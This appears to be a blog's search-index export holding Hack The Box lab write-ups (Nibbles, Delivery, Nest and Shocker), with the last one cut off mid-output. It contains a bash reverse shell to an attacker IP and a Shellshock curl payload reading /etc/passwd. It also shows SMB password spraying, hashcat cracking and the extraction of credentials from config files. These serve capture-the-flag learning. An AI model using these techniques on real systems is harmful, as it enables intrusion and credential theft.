2017 .. -r——– 1 nibbler nibbler 1855 Dec 10 2017 personal.zip\nUnzip the file: nibbler@Nibbles:/home/nibbler$ unzip personal.zip unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh\nNow we have sudo privileges to a bash-script that we can read, write and execute. We have two paths to root here:\n\n\nModify the script to send a reverse shell back as root.\nDelete the script and create a new, with the same name (monitor.sh), to execute root commands for us (i.e. send rev shell)\n\nFor me, I think option B is easiest.\nnibbler@Nibbles:/home/nibbler/personal/stuff/$ cat monitor.sh #!/bin/bash bash -i &gt;& /dev/tcp/10.10.14.10/4499 0&gt;&1\nnibbler@Nibbles:/home/nibbler/personal/stuff/$ chmod +x monitor.sh nibbler@Nibbles:/home/nibbler/personal/stuff/$ sudo /home/nibbler/personal/stuff/monitor.sh\n[root:/git/htb/nibbles]# nc -lvnp 4499 (master✱) listening on [any] 4499 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.75] 45302 bash: cannot set terminal process group (1324): Inappropriate ioctl for device bash: no job control in this shell\nroot@Nibbles:/home/nibbler/personal/stuff# whoami root root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt 0a39fa7459fb58a9f4e22cdaeb6b52c1\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nNibbleblog RCE: https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/"
  },
  {
    "objectID": "posts/2021-03-23-htb-writeup-delivery/2021-03-23-htb-writeup-delivery.html",
    "href": "posts/2021-03-23-htb-writeup-delivery/2021-03-23-htb-writeup-delivery.html",
    "title": "Delivery - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n[root:/git/htb/delivery]# nmap -p- 10.10.10.222 (master✱) Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 09:30 CET Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.036s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8065/tcp open unknown\nDIRB: ==&gt; DIRECTORY: http://10.10.10.222/assets/ ==&gt; DIRECTORY: http://10.10.10.222/error/ ==&gt; DIRECTORY: http://10.10.10.222/images/ + http://10.10.10.222/index.html (CODE:200|SIZE:10850)\n==&gt; DIRECTORY: http://helpdesk.delivery.htb/api/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/apps/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/assets/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/css/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/images/ + http://helpdesk.delivery.htb/index.php (CODE:200|SIZE:5010) ==&gt; DIRECTORY: http://helpdesk.delivery.htb/js/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/kb/ ==&gt; DIRECTORY: http://helpdesk.delivery.htb/pages/ + http://helpdesk.delivery.htb/web.config (CODE:200|SIZE:2197)\nFFUF: http://helpdesk.delivery.htb/FUZZ scp [Status: 301, Size: 185, Words: 6, Lines: 8]"
  },
  {
    "objectID": "posts/2021-03-23-htb-writeup-delivery/2021-03-23-htb-writeup-delivery.html#nikto",
    "href": "posts/2021-03-23-htb-writeup-delivery/2021-03-23-htb-writeup-delivery.html#nikto",
    "title": "Delivery - Hack The Box",
    "section": "NIKTO:",
    "text": "NIKTO:\nURLS: http://10.10.10.222:8065/login # Mattermost login http://helpdesk.delivery.htb/ http://helpdesk.delivery.htb/scp/login.php\n\nLooking on http://10.10.10.222 we are greeted with the text; &gt; “The best place to get all your email related support &gt; For an account check out our helpdesk”\n\nHovering over ‘helpdesk’ we see that it’s a link to ‘helpdesk.delivery.htb’, add that to /etc/hosts.\nContinuing and press on ‘Contact Us’ and we get the text; &gt; “For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.”\nHovering over ‘MatterMost’ we see a link to ‘http://10.10.10.222:8065/login’.\nWith this information, we should probably go to helpdesk.delivery.htb, create a @delivery.htb email and then go to their MatterMost server.\n\nCreate a support ticket.\n\nOpen a New Ticket &gt; Email: asdfasdf@test.test Name: tester Topic: Contact Us Issue: test Text: test\n\nSupport ticket request created tester, You may check the status of your ticket, by navigating to the Check Status page using ticket id: 8820668. If you want to add more information to your ticket, just email 8820668@delivery.htb. Thanks, Support Team\n\nView the ticket by entering email ‘asdfasdf@test.test’ and ticket id ‘8820668’\n\nMy thought process here is that we should create a ticket, and thus also creating a XXXXX@delivery.htb email account. When creating a ticket we get the info “to add more information to your ticket, just email XXXXX@delivery.htb”. Maybe we can send a password reset from MatterMost to XXXXX@delivery.htb, and the info will be added to our ticket?\n\nCreate a new MatterMost account; Email: 8820668@delivery.htb Name: pThree Pass: Test123!“#\n\n“Please verify your email address. Check your inbox for an email.”\n\nRefresh the ticket tab and we see the email confirmation from MatterMost telling us to verify the account; http://delivery.htb:8065/do_verify_email?token=cjsxt4u5abci6g95jfua8fwmjte88grawe3qis19f6pi45fpioc6mgxaz4fe7i6h&email=8820668%40delivery.htb\nOnce logged in to MatterMost we see a message from root asking the devs to update OSTicket, and the credentials: maildeliverer:Youve_G0t_Mail!\nRoot also says: “Also please create a program to help us stop re-using the same passwords everywhere…. Especially those that are a variant of”PleaseSubscribe!“” “PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.”\n\nLogin with maildeliverer:Youve_G0t_Mail! and grab user.txt\n\n[root:/git/htb/delivery]# ssh maildeliverer@delivery.htb maildeliverer@Delivery:~$ cat user.txt 618f481b170b20451b8d430948d2a988\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nUpload and run linpeas\n\nmaildeliverer@Delivery:/dev/shm$ ./linpeas.sh — snip — root 654 0.0 0.1 29208 8004 ? Ss 04:33 0:00 /usr/sbin/cupsd -l root 886 0.0 0.4 29536 18000 ? S 04:34 0:00 python3 /root/py-smtp.py — snip — [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1025 0.0.0.0:* LISTEN - — snip — [+] Backup files? -rwxr-xr-x 1 root root 38412 Nov 25 04:50 /usr/bin/wsrep_sst_mariabackup\nlinpeas dosn’t find anything real interesting. We see port 3306 (MariaDB), 631 (CUPSD) and 1025 (SMTP) running locally. MariaDB and SMTP makes sense, as the service had a mailserver and probably stores the tickets, accounts etc in a database. CUPSD is for me unknown, so we go ahead a try to look for database information.\nmaildeliverer@Delivery:/var/www/osticket/upload/include$ cat ost-config.php — snip — # Encrypt/Decrypt secret key - randomly generated during installation. define(‘SECRET_SALT’,‘nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3’);\n#Default admin email. Used only on db connection issues and related alerts. define(‘ADMIN_EMAIL’,‘maildeliverer@delivery.htb’);\n# Database Options # ————————————————— # Mysql Login info define(‘DBTYPE’,‘mysql’); define(‘DBHOST’,‘localhost’); define(‘DBNAME’,‘osticket’); define(‘DBUSER’,‘ost_user’); define(‘DBPASS’,‘!H3lpD3sk123!’);\n# Table prefix define(‘TABLE_PREFIX’,‘ost_’);\nmaildeliverer@Delivery:/var/www/osticket/upload/include$ mariadb -h localhost -D osticket -u ost_user -p Enter password: !H3lpD3sk123! MariaDB [osticket]&gt; MariaDB [osticket]&gt; DESCRIBE ost_user_account; +————+——————+——+—–+———————+—————-+ | Field | Type | Null | Key | Default | Extra | +————+——————+——+—–+———————+—————-+ | id | int(11) unsigned | NO | PRI | NULL | auto_increment | | user_id | int(10) unsigned | NO | MUL | NULL | | | status | int(11) unsigned | NO | | 0 | | | timezone | varchar(64) | YES | | NULL | | | lang | varchar(16) | YES | | NULL | | | username | varchar(64) | YES | UNI | NULL | | | passwd | varchar(128) | YES | | NULL | | | backend | varchar(32) | YES | | NULL | | | extra | text | YES | | NULL | | | registered | timestamp | YES | | current_timestamp() | | +————+——————+——+—–+———————+—————-+ 10 rows in set (0.001 sec)\nMariaDB [osticket]&gt; SELECT id,user_id,username,passwd FROM ost_user_account; +—-+———+———-+————————————————————–+ | id | user_id | username | passwd | +—-+———+———-+————————————————————–+ | 1 | 7 | NULL | $2a\\(08\\)rgQoa/Pwz1tb6ppfKhmtTunPOzVz2flI7JQ.Hb2DY5zBQfCylQJjq | | 2 | 8 | NULL | $2a\\(08\\)kz/5w9eI.e2VRCZeaep3U.a5.i.a6cXYfPeNQ0CmnmEHwHAjzS3ve | | 3 | 9 | NULL | $2a\\(08\\)YkHXzo9yIxEUjOs583X/jucqrwtGazzXQmGMHBRM4NZ2.WGMH2OZq | | 4 | 10 | NULL | $2a\\(08\\)KrtpXlS/qC2bFa410TV17eEu7bMBUWSOJXyXv6F0aiI9ABrDRP07q | | 5 | 11 | NULL | $2a\\(08\\)skz09GR4/zJ.JLwlKmMbueyvQRYoV3wocPeGNuC8.PDXHvdFS2cHW | +—-+———+———-+————————————————————–+\nMariaDB [osticket]&gt; SELECT username,passwd FROM ost_staff; +—————+————————————————————–+ | username | passwd | +—————+————————————————————–+ | maildeliverer | $2a\\(08\\)VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy | +—————+————————————————————–+\nAll hashes are for user accounts on /var/www, no need to crack them.\n\nLets move on and see if we can find any hashes from the MatterMost service.\n\nmaildeliverer@Delivery:/opt/mattermost/config$ cat config.json “ServiceSettings”: { — snip — “GfycatApiKey”: “2_KtH_W5”, “GfycatApiSecret”: “3wLVZPiswc3DnaiaFoLkDvB4X0IV6CpMkj4tf2inJRsBY6-FnkT08zGmppWFgeof”, “SqlSettings”: { “DriverName”: “mysql”, “DataSource”: “mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8026readTimeout=30s026writeTimeout=30s”, “AtRestEncryptKey”: “n5uax3d4f919obtsp1pw1k5xetq1enez”, “FileSettings”: { — snip — “PublicLinkSalt”: “8818u8uiz1n9rykuwgiqttfzgu6iixhz”,\nThe obvious credentials ‘mmuser:Crack_The_MM_Admin_PW’ points towards MySQL/MariaDB port 3306, lets login and see if we can grab the admin hash.\nmaildeliverer@Delivery:/opt/mattermost/data$ mysql -h localhost -u mmuser -p MariaDB [(none)]&gt; show databases; +——————–+ | Database | +——————–+ | information_schema | | mattermost | +——————–+ MariaDB [mattermost]&gt; SELECT Username,Password FROM Users; +———————————-+————————————————————–+ | Username | Password | +———————————-+————————————————————–+ | surveybot | | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a\\(10\\)u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | | root | $2a\\(10\\)VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | | ff0a21fc6fc2488195e16ea854c963ee | $2a\\(10\\)RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | | channelexport | | | 9ecfb4be145d47fda0724f697f35ffaf | $2a\\(10\\)s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | +———————————-+————————————————————–+\nThe hashes looks like bcrypt, so we use mode 3200 for cracking. https://hashcat.net/wiki/doku.php?id=example_hashes\n\nWe probably only need the root hash, however I save all of them. Setup hashcat and start cracking!\n\nFrom the hints in MatterMost earlier, one part of the password is probably ‘PleaseSubscribe!’, we can easily try this with a mask attack - working our way up one letter at the time.\nroot@nidus:/git/htb/delivery# hashcat -m3200 root.hash -a3 PleaseSubscribe?a?a?a — snip — $2a\\(10\\)VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21\nSession……….: hashcat Status………..: Cracked\nAnother maybe solution would be to use rules; [root:/git/htb/delivery]# hashcat -a0 -m3200 root.hash PleaseSubscribe.txt -r d3adhob0.rule\nmaildeliverer@Delivery:/opt/mattermost/data$ su Password: PleaseSubscribe!21 root@Delivery:/opt/mattermost/data# cat /root/root.txt 4162b5f3180d82b27627f957f4664c2c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nHashcat Mask Attack: https://hashcat.net/wiki/doku.php?id=mask_attack#examples"
  },
  {
    "objectID": "posts/2020-01-28-htb-writeup-nest/2020-01-28-htb-writeup-nest.html",
    "href": "posts/2020-01-28-htb-writeup-nest/2020-01-28-htb-writeup-nest.html",
    "title": "Nest - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n nest.htb PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown\nHost script results: |clock-skew: -59m50s | smb2-security-mode: | 2.02: | Message signing enabled but not required | smb2-time: | date: 2020-01-27T06:54:14 |_ start_date: 2020-01-26T15:09:37\nEnumerate the smb share. root@nidus:~# smbclient -L 10.10.10.178 Enter WORKGROUP’s password:\n Sharename       Type      Comment\n ---------       ----      -------\n ADMIN$          Disk      Remote Admin\n C$              Disk      Default share\n Data            Disk\n IPC$            IPC       Remote IPC\n Secure$         Disk\n Users           Disk\nroot@nidus:~# smbclient \\\\nest.htb\\Users smb: &gt; ls . D 0 Sun Jan 26 00:04:21 2020 .. D 0 Sun Jan 26 00:04:21 2020 Administrator D 0 Fri Aug 9 17:08:23 2019 C.Smith D 0 Sun Jan 26 08:21:44 2020 L.Frost D 0 Thu Aug 8 19:03:01 2019 R.Thompson D 0 Thu Aug 8 19:02:50 2019 TempUser D 0 Thu Aug 8 00:55:56 2019\nsmb: &gt; get “Welcome Email.txt” getting file Email.txt of size 425 as Welcome Email.txt (3.5 KiloBytes/sec) (average 2.0 KiloBytes/sec)\nsmb: &gt; get “Maintenance Alerts.txt” getting file Alerts.txt of size 48 as Maintenance Alerts.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)\nroot@nidus:/opt/htb/machines/nest# cat MaintenanceAlerts.txt There is currently no scheduled maintenance work\nroot@nidus:/opt/htb/machines/nest# cat WelcomeEmail.txt We would like to extend a warm welcome to our newest member of staff,  \nYou will find your home folder in the following location: \\HTB-NEST&lt;USERNAME&gt;\nIf you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you.\nUsername: TempUser Password: welcome2019\nThank you HR\nWe’ve found a list of 5 users, and what seems to be a default password. Lets see if any account hasn’t changed the password yet.\nmsf5 auxiliary(scanner/smb/smb_login) &gt; run [*] 10.10.10.178:445 - 10.10.10.178:445 - Starting SMB login bruteforce [-] 10.10.10.178:445 - 10.10.10.178:445 - Failed: ‘.:welcome2019’, [-] 10.10.10.178:445 - 10.10.10.178:445 - Failed: ‘..Smith:welcome2019’, [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Frost:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Thompson:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘.:welcome2019’ [*] nest.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed\nWe found three sets of working creds! Lets enumerate smb again using all the found accounts.\nL.Frost:welcome2019 - finds nothing interesting R.Thompson:welcome2019 - finds nothing interesting TempUser:welcome2019 - has access to all folders, and within ITwe find a few interesting XML’s.\nRUScanner - We find a new set of creds. The password looks base64 encoded however decoding it gives us nothing of use. c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= NotepadPlusPlus - We find a new user from IT - Carl. Atlas - A few new names and possible users, Deanna Meyer (D.Meyer), Jolie Lenehan (J.Lenehan), Robert O’Hara (R.Ohara)\nroot@nidus:/opt/htb/machines/nest/RuScanner# cat RU_config.xml   389 c.smith fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\nroot@nidus:/opt/htb/machines/nest/NotepadPlusPlus# cat config.xml   ..                    \nroot@nidus:/opt/htb/machines/nest/Atlas# cat Temp.XML  Marketing PlanProduct1Assigned toDeanna MeyerNew featuresCompetitive strengthsCompetitive weaknessesPlacement1Assigned toJolie LenehanPrice1Assigned toRobert O’HaraPromotion1Assigned toRobert O’HaraAdvertisingMailingsTrade shows\nAdd the new found users to our user-list and scan again using msf and default password ‘welcome2019’ msf5 auxiliary(scanner/smb/smb_login) &gt; run [*] 10.10.10.178:445 - 10.10.10.178:445 - Starting SMB login bruteforce [-] 10.10.10.178:445 - 10.10.10.178:445 - Failed: ‘.:welcome2019’, [-] 10.10.10.178:445 - 10.10.10.178:445 - Failed: ‘..Smith:welcome2019’, [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Frost:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Thompson:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘.:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘.:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Meyer:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Lenehan:welcome2019’ [+] 10.10.10.178:445 - 10.10.10.178:445 - Success: ‘..Ohara:welcome2019’ [*] nest.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed\n\nAll of the new found accounts are working with the default password, even Carl from IT. Lets start by enumerating shares. Carl - Nothing D.Meyer - Nothing J.Lenehan - Nothing R.Ohara - Nothing\nroot@p3:/opt/htb/machines# smbmap -H 10.10.10.178 -u TempUser -p welcome2019 -R\n\nFrom the NotepadPlusPlus config.xml we found the path \\HTB-NEST$ however we can’t list it using smbclient. Instead we can mount the directory to read it’s content. The Creds Carl:welcome2019 doesn’t work, however TestUser does.\nroot@p3:/opt/htb/machines/nest# mount -t cifs //nest.htb/Secure\\(/IT/Carl temp/ -o user=tempuser\n   Password for tempuser@//nest.htb/Secure\\)/IT/Carl: *********** (welcome2019)\nWithin we find a VB-project called RUScanner, within there are some functions for encrypting and decrypting. We probably need to reverse engineer these in order to decrypt the hash we found earlier (fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=).\nOpening the project in Visual Studio and trying to run it gives us the error: “System.IO.FileNotFoundException: ’Could not find file ’C:_Config.xml’.’” We previously downloaded that .xml from the SMB Share, put it in the suggested dir and run the project again, it should now run smothly without any issues.\nLooking through the files we find the script Module1.vb containing a password decryption string. Under the password line we can simply print the password by typing “Console.WriteLine(test.password)”, right click on the line and press “Run to Cursor”. In the Autos output at the bottom we can see that the variable test.password contains string “xRxRxPANCAK3SxRxRx”.\nMount the SMB Share \\10.10.10.178, login as C.Smith:xRxRxPANCAK3SxRxRx and grab user.txt from .Smith\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nIn C.Smith’s directory we find a few files, a empty .txt, a .xml and an .exe. Reading the forums they say that the empty .txt is not in fact empty, but has data “flowing” through it. This is a vague hint of stream, which in fact means Alternate Data Streams (ADS).\nWe investigate this by executing dir /R (/R - Display alternate data streams of the file.)\nZ:.SmithReporting&gt;dir /R Volume in drive Z has no label. Volume Serial Number is 2C6F-6A14 Directory of Z:.SmithReporting 2019-08-09 00:06\n\n. 2019-08-09 00:06\n\n.. 2019-08-09 13:18\n\nAD Integration Module 2019-08-09 00:08 0 Debug Mode Password.txt 15 Debug Mode Password.txt:Password:$DATA 2019-08-09 00:09 249 HQK_Config_Backup.xml 2 File(s) 249 bytes 3 Dir(s) 26 417 422 336 bytes free\nAnd we do infact find a hidden file. Open it using notepad and find the content “WBQ201953D8w”. notepad Debug Mode Password.txt:Password:$DATA\nLogin on the high port using telnet (telnet nest.htb 4386). Use the found debug password and we get new commands. &gt;debug WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available\n\nhelp This service allows users to run queries against databases using the legacy HQK format — AVAILABLE COMMANDS — LIST SETDIR  RUNQUERY  DEBUG  HELP  SERVICE SESSION SHOWQUERY \n\nEnumerate the box and we find HQK/LDAP/Ldap.conf &gt;list Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf Current Directory: LDAP &gt;showquery 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\nAnother encrypted password, though this time for Administrator. Trying to decrypt it the same way as (temp)user gives us the error ‘Padding is invalid and cannot be removed.’. Reading about this error, it is because we are using the wrong key to decrypt the data.\nFrom the vb-project, script file Utils.vb we find the decryption string (and key) on line 16: Return Decrypt(EncryptedString, “N3st22”, “88552299”, 2, “464R5DFA5DL6LE28”, 256)\nDecompiling the .exe found in dir LDAP, HqkLdap.exe, with dotPeak and looking at it’s decryption string we find another set of keys: string.Empty : CR.RD(EncryptedString, “667912”, “1313Rf99”, 3, “1L1SA61493DRV53Z”, 256)\nModify the current script in the vb-project to match the decompiled keys, run the program and we’ll get the Administrator pass. Administrator:XtH4nkS4Pl4y1nGX\nMount \\nest.htb$ as Administrator:XtH4nkS4Pl4y1nGX and grab root.txt. &gt; type root.txt 6594c2eb084bc0f08a42f0b94b878c41\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nVisual Studio Download https://softfamous.com/visual-studio-2010/\nVisual Studio Coding https://docs.microsoft.com/en-us/dotnet/core/tutorials/debugging-with-visual-studio?tabs=csharp"
  },
  {
    "objectID": "posts/2021-02-19-htb-writeup-shocker/2021-02-19-htb-writeup-shocker.html",
    "href": "posts/2021-02-19-htb-writeup-shocker/2021-02-19-htb-writeup-shocker.html",
    "title": "Shocker - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/shocker]# nmap -Pn -n -sCV 10.10.10.56 (master✱) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |http-title: Site doesn’t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: + http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)\nNIKTO: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS\n\nVisiting the webpage there’s an image of a blob with a hammer over him, saying “Don’t bug me!”. Binwalking the image gives nothing, so there’s something hidden on the server.\nroot@nidus:/git/htb/shocker# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.56/cgi-bin/FUZZ.sh — snip — user [Status: 200, Size: 118, Words: 19, Lines: 8]\nAs we find a .sh file on the server, we can try to see if shellshock is possible with this simple curl poc\nroot@nidus:/git/htb/shocker# curl -H ‘User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd’ bash -s :’’ http://10.10.10.56/cgi-bin/user.sh root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 